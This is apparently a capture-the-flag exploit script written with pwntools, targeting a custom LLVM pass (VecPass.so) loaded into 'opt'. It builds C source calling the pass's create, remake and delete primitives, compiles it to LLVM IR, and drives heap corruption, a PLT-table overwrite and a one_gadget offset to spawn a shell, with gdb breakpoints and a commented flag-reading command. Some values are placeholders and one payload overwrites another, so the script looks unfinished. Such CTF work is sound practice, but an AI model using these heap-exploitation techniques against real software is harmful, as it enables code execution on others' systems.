from pwn import *
import os
def crt(sz,tp):
    return "create(%d,%d);"%(sz,tp)

def rmk(id,ns,tp):
    return "remake(%d,%d,%d);"%(id,ns,tp)

def delt(id):
    return "delete(%d);"%(id)

def f_add(val):
    return "add(%d);"%(val)

def f_sub(val):
    return "sub(%d);"%(val)

def f_and(val):
    return "and(%d);"%(val)

def f_or(val):
    return "or(%d);"%(val)

def f_xor(val):
    return "xor(%d);"%(val)

def swp():
    return "swap();"

def end():
    return "end();"

def var(nm):
    return "int %s;"%(nm)

def ifcond(cond,l):
    return "if(%s){\n%s}\n"%(cond,'\n'.join(l))

ofs_oneg=0x7f82a3e1a320-(0x10dbcf+0x7f82a3c00000)

tmpl=open("tmpl","r").read()
plt_addr_enc=0x447818^0x509#0x449+(0~0x2000)
plt_addr_enc=0xdeadbeef#0x449+(0~0x2000)
ofs_plt=(0x509d30-0x4bd000)//16
#447100

pld="\n".join([
    rmk(ofs_plt,plt_addr_enc,0),
    crt(0xff,1),
    f_sub(ofs_oneg),#num=oneg
    crt(0xd0,2),
    crt(0xd0,2),
    delt(0),
    delt(0),
    delt(0),
    end()
])
'''
pld="\n".join([
    var("a"),
    crt(0xff,1),
    ifcond("a",[
        crt(0x10,1),
        crt(0x20,1),
    ])
])'''

pld='\n'.join([
    rmk(14,0x70,1),
    crt(70,1),
    crt(70,1),
    delt(0),
    delt(0),
])
src=tmpl%(pld)


open("exp.c","w").write(src)
os.system("clang -emit-llvm -S exp.c -o exp.ll")

scr='\n'.join(['set max-visualize-chunk-size 0x80',
               'b main',
               'c',
               #'b llvm::PassRegistry::registerPass(llvm::PassInfo const&, bool)',
               'b open',
               'c',
               'set $so_base = (size_t) &nm - 0x158E8',
               'b* ($so_base + 0xA3D1)',
               'c',
               'set $ck = *(void**)($rbp-0x28)',
               #'b malloc',
               'b* $so_base+0xb49b',
               'b _exit',
               #'disable',
               'b* 0x415ba0',
               #'b* 0x415da0'
               ])

p=gdb.debug('./opt -load ./VecPass.so -winmt exp.ll -enable-new-pm=0 -f'.split(' '),gdbscript=scr)
#p=process('./opt -load ./VecPass.so -winmt exp.ll -enable-new-pm=0 -f'.split(' '))
#p.recvuntil(b'linux-gnuexp.c')

context.log_level='debug'
#p.sendline(b"cat /flag;cat flag;cat f*")
p.interactive()